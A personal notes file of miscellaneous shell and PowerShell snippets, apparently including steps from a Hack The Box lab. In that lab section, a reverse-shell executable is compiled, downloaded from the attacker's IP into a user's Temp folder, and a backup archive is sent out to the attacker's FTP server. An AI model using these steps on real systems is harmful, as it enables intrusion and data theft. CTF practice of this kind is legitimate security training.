# Miscellaneous stuff to be sorted later

Powershell
Create result.zip from the entire Test folder:
```
Compress-Archive -Path C:\Test -DestinationPath C:\result
```

Powershell
Extract the content of result.zip in the specified Test folder:
```
Expand-Archive -Path result.zip -DestinationPath C:\Test
```


Windows - view encrypted files/folders
```
cipher /U /N
```

Windows Events Command Line Utility.
```
wevtutil /?

```

I used a c++ shell
https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp

compile:
```
i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

Copy to box:
Invoke-WebRequest -Uri http://10.10.14.25/prometheus.exe -OutFile C:\Users\Alfred\AppData\Local\Temp\prometheus.exe




use python ftp module to copy file back to my box:
```
root@kali:~/Documents/htb/boxes/arkham/ftp# python -m pyftpdlib -p 21 -w -d `pwd` -i 10.10.14.25
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2019-05-16 00:09:35] >>> starting FTP server on 10.10.14.25:21, pid=13089 <<<
[I 2019-05-16 00:09:35] concurrency model: async
[I 2019-05-16 00:09:35] masquerade (NAT) address: None
[I 2019-05-16 00:09:35] passive ports: None
[I 2019-05-16 00:12:24] 10.10.10.130:49688-[] FTP session opened (connect)
[I 2019-05-16 00:12:25] 10.10.10.130:49688-[anonymous] USER 'anonymous' logged in.
[I 2019-05-16 00:12:25] 10.10.10.130:49688-[anonymous] STOR /root/Documents/htb/boxes/arkham/ftp/backup.zip completed=1 bytes=124257 seconds=0.159
[I 2019-05-16 00:12:25] 10.10.10.130:49688-[anonymous] FTP session closed (disconnect).


C:\Users\Alfred\Downloads\backups>curl -T backup.zip ftp://10.10.14.25



readpst -rS alfred@arkham.local.ost
```



Deleting lines from file
```
# To remove the line and print the output to standard out:
sed '/pattern to match/d' ./infile

# To directly modify the file:
sed -i '/pattern to match/d' ./infile

# To directly modify the file (and create a backup):
sed -i.bak '/pattern to match/d' ./infile

# For Mac OS X and FreeBSD users:
sed -i '' '/pattern/d' ./infile
```


search bash_history for most used commands
```
sort ~/.bash_history |uniq -c|sed -e 's/^[[:space:]]*//'|sort -n
```

weather:
```bash
curl wttr.in/

curl wttr.in/<CityName>

curl wttr.in/:help

# https://github.com/chubin/wttr.in
```

get current directory basename
```shell
result=${PWD##*/}          # to assign to a variable

printf '%s\n' "${PWD##*/}" # to print to stdout
                           # ...more robust than echo for unusual names
                           #    (consider a directory named -e or -n)

printf '%q\n' "${PWD##*/}" # to print to stdout, quoted for use as shell input
                           # ...useful to make hidden characters readable.
```
